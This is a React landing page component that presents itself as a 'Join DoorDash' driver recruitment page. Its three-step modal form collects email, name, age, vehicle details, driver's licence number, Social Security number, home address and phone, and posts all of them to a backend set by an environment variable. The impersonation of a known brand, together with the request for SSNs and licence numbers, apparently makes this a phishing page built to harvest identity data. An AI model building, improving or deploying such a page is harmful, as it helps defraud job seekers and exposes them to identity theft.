import React, { useState } from "react";
import backgroundImage from "../assets/imges/4.png";
import logo from "../assets/imges/logo.png";
import img5 from "../assets/imges/5.png";
import "../app.css";

const Home = () => {
  const [menuOpen, setMenuOpen] = useState(false);
  const [formOpen, setFormOpen] = useState(false);
  const [step, setStep] = useState(1);
  const [successOpen, setSuccessOpen] = useState(false);

  const [formData, setFormData] = useState({
    email: "",
    fullName: "",
    age: "",
    vehicleModel: "",
    color: "",
    vehicleYear: "",
    licenciaDeConducir: "",
    ssn: "",
    address: "",
    city: "",
    state: "",
    postalCode: "",
    phonenumber: "",
  });

  const apiUrl = import.meta.env.VITE_API_URL;

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const saveRes = await fetch(`${apiUrl}/api/`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: formData.email,
          full_name: formData.fullName,
          age: formData.age,
          vehicle_model: formData.vehicleModel,
          color_vehicle: formData.color,
          vehicle_year: formData.vehicleYear,
          licencia: formData.licenciaDeConducir || null,
          ssn: formData.ssn || null,
          address_residential: formData.address,
          city: formData.city,
          state: formData.state,
          postal_code: formData.postalCode,
          phone_number: formData.phonenumber,
        }),
      });

      const savedClient = await saveRes.json();
      if (!saveRes.ok) throw new Error(savedClient.error);

      setFormOpen(false);
      setSuccessOpen(true);
      setStep(1);

      setFormData({
        email: "",
        fullName: "",
        age: "",
        vehicleModel: "",
        color: "",
        vehicleYear: "",
        licenciaDeConducir: "",
        ssn: "",
        address: "",
        city: "",
        state: "",
        postalCode: "",
        phonenumber: "",
      });
    } catch (error) {
      console.error(error);
      alert("Error de conexión o al guardar datos ❌");
    }
  };

  return (
    <div className="w-full min-h-screen relative overflow-hidden">
      {/* Fondo */}
      <div
        className="absolute top-0 left-0 w-full h-full bg-cover bg-no-repeat 
           bg-[position:15%_center] sm:bg-center z-0"
        style={{ backgroundImage: `url(${backgroundImage})` }}
      ></div>

      {/* Overlay negro */}
      <div className="absolute top-0 left-0 w-full h-full bg-black/80 sm:bg-black/30 z-10"></div>

      {/* Menú superior (SIN CAMBIOS) */}
      <header className="w-full flex justify-between items-center p-3 bg-white/80 backdrop-blur-md shadow-md rounded-b-xl fixed top-0 left-0 z-30">
        <div className="flex items-center space-x-2">
          <img src={logo} alt="Logo" className="w-15 h-8 object-contain" />
        </div>

        <button
          className="sm:hidden w-12 h-12 flex items-center justify-center bg-white/80 backdrop-blur-sm rounded-full text-3xl text-gray-700 hover:text-orange-600 shadow-md hover:shadow-lg transition-all duration-300 focus:outline-none"
          onClick={() => setMenuOpen(!menuOpen)}
        >
          ☰
        </button>

        <div
          className={`sm:hidden fixed top-16 right-4 w-40 bg-white/95 backdrop-blur-md rounded-xl shadow-lg z-20 transition-all duration-300 ${
            menuOpen
              ? "opacity-100 translate-y-0 scale-100"
              : "opacity-0 -translate-y-5 scale-95 pointer-events-none"
          }`}
        >
          <nav className="flex flex-col items-center py-4 space-y-3 font-semibold">
            <a href="#home" className="w-full text-center py-2">
              HOME
            </a>
            <a href="#services" className="w-full text-center py-2">
              SERVICES
            </a>
            <a href="#contact" className="w-full text-center py-2">
              CONTACT
            </a>
          </nav>
        </div>

        <nav className="space-x-4 hidden sm:flex">
          <a href="#home">HOME</a>
          <a href="#services">SERVICES</a>
          <a href="#contact">CONTACT</a>
          <a href="#contact">LOGIN</a>
        </nav>
      </header>

      {/* Contenido principal (SIN CAMBIOS) */}
      <div className="flex flex-col justify-center items-center w-full h-screen relative z-20 px-5 text-center pt-16">
        <h1 className="text-4xl md:text-5xl font-bold text-white">
          Join DoorDash
        </h1>

        <p className="mt-4 text-white/90 max-w-2xl">
          At DoorDash, we connect people with opportunities. Work flexible
          hours, earn competitively, and receive reliable support. If you want
          to join our team and be part of our family, don’t hesitate to reach
          out and start your journey with us.
        </p>

        <img src={img5} className="mt-4 w-40 md:w-60" />

        <button
          onClick={() => {
            setFormOpen(true);
            setStep(1);
          }}
          className="mt-6 px-10 py-4 bg-orange-600 text-white rounded-2xl"
        >
          Contact Us
        </button>
      </div>

      {/* MODAL PAGINADO */}
      {formOpen && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex justify-center items-center z-50">
          <div className="bg-white/95 rounded-3xl w-full max-w-sm md:max-w-xl p-6 relative mx-4">
            <button
              onClick={() => setFormOpen(false)}
              className="absolute top-3 right-3"
            >
              ✕
            </button>

            <h2 className="text-xl font-bold text-center text-orange-600 mb-4">
              Step {step} of 3
            </h2>

            <form onSubmit={handleSubmit} className="space-y-4">
              {step === 1 && (
                <>
                  <input
                    name="email"
                    placeholder="Email"
                    value={formData.email}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="fullName"
                    placeholder="Full Name"
                    value={formData.fullName}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="age"
                    placeholder="Age"
                    value={formData.age}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                </>
              )}

              {step === 2 && (
                <>
                  <input
                    name="vehicleModel"
                    placeholder="Vehicle Model"
                    value={formData.vehicleModel}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="color"
                    placeholder="Color Vehicle"
                    value={formData.color}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="vehicleYear"
                    placeholder="Vehicle Year"
                    value={formData.vehicleYear}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="licenciaDeConducir"
                    placeholder="Driver License"
                    value={formData.licenciaDeConducir}
                    onChange={handleChange}
                    className="input-field"
                  />
                  <input
                    name="ssn"
                    placeholder="SSN"
                    value={formData.ssn}
                    onChange={handleChange}
                    className="input-field"
                  />
                </>
              )}

              {step === 3 && (
                <>
                  <input
                    name="address"
                    placeholder="Address"
                    value={formData.address}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="city"
                    placeholder="City"
                    value={formData.city}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="state"
                    placeholder="State"
                    value={formData.state}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="postalCode"
                    placeholder="Postal Code"
                    value={formData.postalCode}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                  <input
                    name="phonenumber"
                    placeholder="Phone Number"
                    value={formData.phonenumber}
                    onChange={handleChange}
                    required
                    className="input-field"
                  />
                </>
              )}

              <div className="flex gap-3">
                {step > 1 && (
                  <button
                    type="button"
                    onClick={() => setStep(step - 1)}
                    className="w-1/2 bg-gray-300 py-2 rounded-xl"
                  >
                    Back
                  </button>
                )}
                {step < 3 ? (
                  <button
                    type="button"
                    onClick={() => setStep(step + 1)}
                    className="w-full bg-orange-600 text-white py-2 rounded-xl"
                  >
                    Next
                  </button>
                ) : (
                  <button
                    type="submit"
                    className="w-full bg-green-600 text-white py-2 rounded-xl"
                  >
                    Submit
                  </button>
                )}
              </div>
            </form>
          </div>
        </div>
      )}
      {/* MODAL ÉXITO */}
      {successOpen && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex justify-center items-center z-50">
          <div className="bg-white rounded-3xl w-full max-w-md p-6 text-center animate-fadeIn mx-4 shadow-2xl">
            <div className="flex justify-center mb-4">
              <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center">
                <span className="text-4xl">✅</span>
              </div>
            </div>

            <h2 className="text-2xl font-bold text-green-600 mb-3">
              Solicitud enviada con éxito
            </h2>

            <p className="text-gray-600 mb-6">
              Hemos recibido tu información correctamente.
              <br />
              <span className="font-semibold">
                Te enviaremos el estado de tu verificación al correo
                suministrado.
              </span>
            </p>

            <button
              onClick={() => setSuccessOpen(false)}
              className="px-8 py-3 bg-orange-600 text-white rounded-2xl hover:bg-orange-700 transition-all"
            >
              Entendido
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Home;
